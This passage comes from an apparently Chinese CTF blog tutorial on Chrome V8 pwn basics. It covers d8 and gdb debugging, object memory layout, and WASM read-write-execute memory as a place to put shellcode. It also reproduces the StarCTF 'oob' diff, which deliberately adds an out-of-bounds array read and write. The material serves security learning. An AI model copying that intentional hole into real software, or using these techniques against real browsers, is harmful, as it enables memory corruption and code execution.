<code>bar</code> 是否被内联</td></tr><tr><td>%CollectGarbage();</td><td>触发垃圾回收</td></tr><tr><td>console.log(%GetHiddenClass(obj));</td><td>获取对象的隐藏类信息</td></tr></tbody></table></div><h2 id="d8调试"><a href="#d8调试" class="headerlink" title="d8调试"></a>d8调试</h2><ul><li>我们先创建一个<code>test.js</code>文件</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params">property_num,element_num</span>) &#123;</span><br><span class="line">  <span class="comment">//添加可索引属性</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; element_num; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>[i] = <span class="string">`element<span class="subst">$&#123;i&#125;</span>`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//添加常规属性</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; property_num; i++) &#123;</span><br><span class="line">      <span class="keyword">let</span> ppt = <span class="string">`property<span class="subst">$&#123;i&#125;</span>`</span></span><br><span class="line">      <span class="variable language_">this</span>[ppt] = ppt</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> <span class="title class_">Foo</span>(<span class="number">10</span>,<span class="number">10</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(%<span class="title class_">HasFastProperties</span>(bar));</span><br><span class="line"><span class="keyword">delete</span> bar.<span class="property">property2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(%<span class="title class_">HasFastProperties</span>(bar));</span><br></pre></td></tr></table></figure><ul><li>然后使用<code>d8 test.js --allow-natives-syntax</code>即可进行调试，使用<code>--allow-natives-syntax</code>就可以调用<code>V8</code>的<code>API</code>，这样就可以输出一些调试信息，这样就可以输出调试信息。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215004347798.png" alt="image-20250215004347798"></p><ul><li>还可以这样进行调试，类似于交互式<code>Shell</code>效果调试。先输入命令<code>../v8/out.gn/x64.debug/d8  --allow-natives-syntax</code></li><li>这样我们就可以进入<code>d8</code>的交互式界面</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215004504171.png" alt="image-20250215004504171"></p><ul><li>然后我们就可以进行一边编写代码一边调试</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215004650130.png" alt="image-20250215004650130"></p><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><ul><li>我们先创建一个<code>test.js</code>文件</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">var</span> username = <span class="string">&quot;iwen&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> age = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">var</span> people_zhangsan = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age);</span><br></pre></td></tr></table></figure><ul><li>使用<code>gdb</code>调试，就要进行如下操作</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ../v8/out.gn/x64.debug/d8</span><br></pre></td></tr></table></figure><ul><li>然后在<code>gdb</code>的内部输入命令，就可以调试了</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> args --allow-natives-syntax test2.js</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215005354891.png" alt="image-20250215005354891"></p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215005454750.png" alt="image-20250215005454750"></p><ul><li>在<code>v8</code>源码中就可以<code>v8</code>自带的调试<code>JS</code>代码的gdb插件，我们先进入<code>/path/to/v8/tools目录</code>，然后在这个目录下可以找到<code>gdbinit</code>文件，这样就可以使用如下命令：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> gdbinit ~/.gdbinit_v8</span><br></pre></td></tr></table></figure><ul><li>之后编辑<code>~/.gdbinit</code>，添加如下文件：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.gdbinit_v8</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218143830509.png" alt="image-20250218143830509"></p><ul><li>这样我们调试的时候就会出现对应的源码</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218144212624.png" alt="image-20250218144212624"></p><ul><li>这里也介绍一下<code>~/.gdbinit_v8</code>中的一些调试命令<ul><li><code>job</code>命令：用于可视化显示<code>JavaScript</code>对象的内存结构。</li><li><code>telescope</code>命令：查看内存数据</li></ul></li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218151701532.png" alt="image-20250218151701532"></p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218151743753.png" alt="image-20250218151743753"></p><p><strong>注意</strong>：由于<code>JS</code>的对象和元素在内存中都是以二进制的形式存在，为了区分对象和元素，我们会将我们会将<code>指向对象地址的值+1</code>，使用这种方法来区别对象和元素。</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="jit编译初步了解"><a href="#JIT编译初步了解" class="headerlink" title="JIT编译初步了解"></a>JIT编译初步了解</h2><ul><li>这里先介绍一下一些基础知识。<code>Chrome V8</code>目前演变成如下解释过程：</li><li><p>当我们编写一个<code>JS</code>代码，使用<code>V8</code>去执行这个<code>JS</code>代码：</p><ul><li>首先我们会通过<code>解析器</code>将<code>V8</code>的<code>JS</code>代码解析为抽象语法树。</li><li>然后会通过<code>解释器</code>对抽象语法树进行解释，将<code>JS</code>代码转换为字节码，一边解释一边执行，并且解释器会记录特定代码片段的运行次数</li><li>当运行次数超过某个阈值，该段代码就会被记为热代码，并且将运行时的信息反馈给<code>优化编译器</code></li><li><code>优化编译器</code>根据反馈信息，优化并编译字节码，生成优化后的机器码，这样再次执行这个代码的时候就会执行相应的机器码。</li></ul></li><li><p>上面的技术就被称为<code>JIT</code>（及时编译技术）</p><ul><li>其中<code>解析器</code>的源码在<code>v8/src/parsing</code></li><li>解释器的源码在<code>v8/src/interpreter</code></li><li>优化编译器源码在<code>v8/src/compiler</code>或者<code>v8/src/maglev</code></li></ul></li></ul><h2 id="js对象通用数据结构"><a href="#JS对象通用数据结构" class="headerlink" title="JS对象通用数据结构"></a>JS对象通用数据结构</h2><ul><li>这边先贴一张图，说明一下<code>JS</code>类的通用数据结构。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250226120215221.png" alt="image-20250226120215221"></p><ul><li>接下来我们使用<code>gdb</code>动态调试，配合<code>job</code>命令和<code>d8</code>中<code>debug</code>模式下查看对象的这些数据结构。我们使用如下<code>js</code>代码</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><ul><li>进行<code>gdb</code>调试，这里我们利用<code>%DebugPrint(a)</code>将<code>a</code>类中的所有数据结构都打印出来了，结果如下，这时我们只要关注红框部分（也就是<code>a</code>对象存储的地址），我们再使用<code>job +a对象的地址</code>，一步一步查看。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250226121328743.png" alt="image-20250226121328743"></p><ul><li>我们现在使用<code>job  0xbe400288671</code>这命令，查看的是这个数据结构，由于在<code>64位系统</code>中，数据都会与<code>8</code>字节或者<code>0x10</code>字节内存对齐，所以对于地址来说哪些是<code>+1</code>后的地址就很明显<ul><li><code>map</code>指向的是一个对象，其地址有<code>+1</code>，<code>map</code>所指向的对象就是我们常说的<code>js</code>隐藏类</li><li><code>prototype</code>指向的也是一个对象，</li><li><code>element</code>指向的也是一个对象，而这个就是存储我们通过索引保存的元素。</li><li><code>length</code>相当于这个对象的一个属性，表示这个数组目前的长度</li><li><code>properties</code>：这个也是一个对象，这个对象就表示的</li></ul></li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250226121414255.png" alt="image-20250226121414255"></p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250226121433824.png" alt="image-20250226121433824"></p><ul><li>接下来我们来查看<code>map</code>这个隐藏类</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250226122103451.png" alt="image-20250226122103451"></p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250226122039724.png" alt="image-20250226122039724"></p><h2 id="js类型混淆"><a href="#JS类型混淆" class="headerlink" title="JS类型混淆"></a>JS类型混淆</h2><h2 id="wasmwebassembly"><a href="#WASM（WebAssembly）" class="headerlink" title="WASM（WebAssembly）"></a>WASM（WebAssembly）</h2><ul><li><code>WASM</code>，就是在<code>web</code>上的汇编。即<code>Asm on the web</code>。</li><li><code>WASM</code>最重要的一点就是可以创建一个<code>可读、可写、可执行</code>的内存空间，这时就可以用于执行我们的<code>shellcode</code>，这里注意，并不能使用<code>WASM</code>来执来汇编后执行<code>shellcode</code>，我们使用<code>WASM</code>的目的其实是开辟一个<code>可读可写可执行</code>的内存段，之后我们再通过漏洞才能将<code>shellcode</code>写入到<code>WASM</code>这个内存中，这样才能执行。</li><li>相应的方法有：<ul><li><code>WebAssembly.Module()</code>：创建一个新的<code>WebAssembly</code>模块对象(其实就是新建一个类，并没有实例成对象)。</li><li><code>WebAssembly.Instance()</code>：创建一个新的 <code>WebAssembly</code> 实例对象（这个时候就会创建一个新对象，就像<code>new Array</code>，已经将类载入到内存中，我们可以使用）。</li><li><code>WebAssembly.Memory()</code>：创建一个新的<code>WebAssembly</code> 内存对象，这个操作会开辟内存空间，这个内存空间相当于<code>字节数组</code>，可读可写，但是不可执行。</li><li><code>WebAssembly.Table()</code>：创建一个新的 <code>WebAssembly</code> 表格对象，这个表格的作用就是动态引用存储函数，可以实现<code>虚函数表</code>之类的功能。</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="keyword">let</span> wasm_mod1 = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code)</span><br><span class="line"><span class="keyword">let</span> wasm_mod2 = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod1, &#123;&#125;);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod2.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">// 由于在新建wasm_mod1和wasm_mod2之间下不了断点，我们只能知道在执行这两个语句后就会出现一个新的可读可写可执行的内存</span></span><br></pre></td></tr></table></figure><ul><li>注意：<code>d8</code>在执行的时候本来就有一个<code>可读可写可执行</code>的段，申请到栈上的附件，而下图是新申请的一个<code>可读可写可执行</code>的内存。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250225224336159.png" alt="image-20250225224336159"></p><h1 id="关于chrome-pwn的题型"><a href="#关于Chrome-pwn的题型" class="headerlink" title="关于Chrome-pwn的题型"></a>关于Chrome-pwn的题型</h1><ul><li><p><code>Chrome-pwn</code>题型有两种</p><ul><li><code>第一种</code>：一般就是对<code>v8</code>进行一些修改，人为制造出一个漏洞，然后给出<code>.diff</code>文件</li><li><code>第二种</code>：直接用<code>CVE</code>出题</li></ul></li><li><p>对于第二种就是看<code>CDVE</code>漏洞在哪，或者一步一步去牢。接下来重点分析第一种题型</p></li><li><p>对于第一种题型，出题人先会对源码进行修改，然后编写<code>.diff</code>文件。而这个<code>.diff</code>文件，是github主要用于<strong>显示代码变更</strong>，是<strong>Git版本控制系统的一部分</strong>。所以给出<code>.diff</code>文件，我们就可以从<code>.diff</code>文件中看出<strong>出题人所修改的地方</strong>，从而发现并利用漏洞。接下来就以<code>2019StarCTF oob</code>这题给的<code>.diff</code>为例子，对<code>.diff</code>的一些进行分析</p></li><li>下面就是该题给的<code>.diff</code>文件，接下来逐句解释一下<code>.diff</code>文件的每行代码的意思<ul><li>前四行是<code>Git Diff</code>格式的头部信息，用于描述<strong>对比的文件</strong>和<strong>修改信息</strong><ul><li><code>diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</code>：这里就表明了对源码中<code>/src/bootstrapper.cc</code>这个文件做了修改<ul><li><code>diff --git</code>是Git生成的差异比较标识</li><li><code>a/src/bootstrapper.cc</code>是修改前的文件，其中<code>a/</code>表示修改前的文件。</li><li><code>b/src/bootstrapper.cc</code>是修改后的文件，<code>b/</code>表示修改后的文件</li></ul></li><li><code>index b027d36..ef1002f 100644</code>：表示哈希和文件权限模式，<code>b027d36</code>修改前的哈希、<code>ef1002f</code>修改后的哈希，<code>100644</code>文件权限模式。这里的哈希仅仅只是被修改文件修改前后的哈希</li><li>第三行和第四行<code>--- a/src/bootstrapper.cc</code>、<code>+++ b/src/bootstrapper.cc</code>，表示修改前和修改后的文件路径</li></ul></li><li><code>@@ -1668,6 +1668,8 @@</code>表示改文件改动的地方：表示改动的位置和行号，从这边我们就可以得知对源码修改了<code>2</code>行<ul><li><code>-1668,6</code>：<code>-</code>表示旧代码，而<code>1668,6</code>表示<code>1668</code>行的位置往下<code>6</code>行；</li><li><code>+1668,8</code>：<code>-</code>表示新代码，而<code>1668,8</code>表示<code>1668</code>行的位置往下<code>8</code>行；</li></ul></li><li>之后的<code>@@ -1668,6 +1668,8 @@</code>之后从第<code>6</code>行到第<code>14</code>行就是展现修改后具体的代码，而有两行开头有<code>+</code>就表示是新添加的代码</li></ul></li><li>该<code>.diff</code>文件的剩余部分是对其它源码文件进行修改，就不做详细介绍了。</li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="魔改v8"><a href="#魔改V8" class="headerlink" title="魔改V8"></a>魔改V8</h1><ul><li><p>参考这篇博客：<a href="https://hornos3.github.io/2024/12/01/chrome-v8-pwn-学习-1/">chrome v8 pwn 学习 (1) | CoLin’s BLOG</a></p></li><li><p>对于第一种类型的出题方式，就需要对<code>v8</code>的源码进行魔改，这里需要理解一下<code>JavaScript</code>和<code>C++</code>，这样会更容易理解，不过现在有<code>AI</code>会方便许多。</p></li><li>对于<code>V8</code>的开发不熟悉的需要多花费一点时间去理解和尝试，这里就先从总体开始了解，如何修改<code>V8</code>的源码编译好的<code>d8</code>中新增加一个全局函数<code>MyFunc()</code>。这个<code>MyFunc()</code>函数的主要功能就是接收用户传入的参数（可以是<code>字符串的数字</code>、<code>浮点数</code>、<code>整数</code>），返回的是传入的参数加上<code>100</code>的结果，这个结果的数据类型默认为<code>整型或者是浮点型</code>。</li><li>接下来就先给出我修改源码后的<code>.diff</code>文件，根据上面初步了解了<code>.diff</code>文件，我们从<code>.diff</code>文件这边可以了解到开发<code>V8</code>流程的其中一小部分，也就是为<code>V8</code>增加一个全局函数。</li><li>接下来是我修改源码后使用<code>git diff &gt; my_changes.diff</code>，从这里可以了解到我们增加一个全局函数需要对源码的什么位置进行修改，接下来说明一下，具体修改了哪些文件的代码<ul><li><code>path/to/v8/BUILD.bazel</code></li><li><code>path/to/v8/BUILD.gn</code></li><li><code>path/to/v8/src/builtins/builtins-definitions.h</code></li><li><code>path/to/v8/src/init/bootstrapper.cc</code></li><li><code>path/to/v8/src/compiler/turbofan-typer.cc</code></li><li><strong>注意：从<code>BUILD.bazel</code>和<code>BUILD.gn</code></strong>，我们可以了解到我们还新建了一个文件，该文件为<code>path/to/v8/src/builtins/builtins-myfunc.cc</code></li></ul></li><li>可以先尝试一下根据<code>.diff</code>文件不用<code>git</code>命令自己尝试修改源码，然后编译，成功添加<code>MyFunc()</code>这个全局函数。也可以根据后面的操作去尝试</li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 